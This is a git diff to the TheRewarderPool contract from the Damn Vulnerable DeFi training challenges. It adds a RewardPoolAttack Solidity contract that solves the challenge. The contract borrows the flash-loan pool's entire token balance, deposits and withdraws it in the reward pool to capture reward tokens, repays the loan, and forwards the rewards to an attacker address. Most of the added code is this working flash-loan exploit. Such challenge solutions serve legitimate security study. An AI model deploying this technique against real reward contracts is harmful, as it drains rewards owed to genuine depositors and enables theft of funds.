@@ -5,7 +5,7 @@ pragma solidity ^0.8.0;
 import "./RewardToken.sol";
 import "../DamnValuableToken.sol";
 import "./AccountingToken.sol";
-
+import "./FlashLoanerPool.sol";
 /**
  * @title TheRewarderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
@@ -14,6 +14,9 @@ import "./AccountingToken.sol";
 contract TheRewarderPool {
 
     // Minimum duration of each round of rewards in seconds
+//uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
+//    uint256 private constant REWARDS_ROUND_MIN_DURATION = 2 ;
+
     uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
 
     uint256 public lastSnapshotIdForRewards;
@@ -100,4 +103,45 @@ contract TheRewarderPool {
     function isNewRewardsRound() public view returns (bool) {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
     }
+}
+
+contract RewardPoolAttack {
+
+        using Address for address;
+	TheRewarderPool public rewardPool;
+        FlashLoanerPool public flashLoan;
+        address public attacker;
+	DamnValuableToken public dvtToken;
+        RewardToken public reward;
+
+        constructor(address _rewardPoolAddr,address _flashLoanAddr,address  _attackerAddr, address _dvtTokenAddr, address _rewardAddr){
+		rewardPool = TheRewarderPool(_rewardPoolAddr);
+                flashLoan = FlashLoanerPool(_flashLoanAddr);
+                attacker = _attackerAddr;
+                dvtToken = DamnValuableToken (_dvtTokenAddr);
+                reward = RewardToken(_rewardAddr);
+        }
+
+
+       function attackReward() public {
+
+	        flashLoan.flashLoan(dvtToken.balanceOf(address(flashLoan)));
+	        //flashLoan.sendValue(dvtToken.balanceOf(address(this)));
+                //reward.transferFrom(address(this),attacker,reward.balanceOf(address(this)));
+ 	uint256 rewardBalance = reward.balanceOf(address(this));
+	reward.transfer(attacker,rewardBalance);
+
+		
+       }
+
+      function receiveFlashLoan(uint256 _amount) public payable {
+	
+	dvtToken.approve(address(rewardPool), _amount);
+	rewardPool.deposit(_amount);
+        rewardPool.withdraw(_amount);
+
+        dvtToken.transfer(address(flashLoan),_amount);
+
+      }
+
 }
